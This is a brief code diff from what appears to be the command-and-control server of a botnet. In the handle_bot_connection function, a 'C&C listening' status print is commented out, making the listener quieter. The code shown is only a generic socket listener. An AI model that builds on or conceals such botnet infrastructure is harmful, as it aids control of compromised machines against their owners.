@@ -79,7 +79,7 @@ def handle_bot_connection():
 
     # configure how many client the server can listen simultaneously
     server_socket.listen(clients)
-    print(f"C&C listening on {host}:{port}")
+    # print(f"C&C listening on {host}:{port}")
     while True:
         conn, address = server_socket.accept()  # accept new connection
         # print('Connected to :', address[0], ':', address[1])
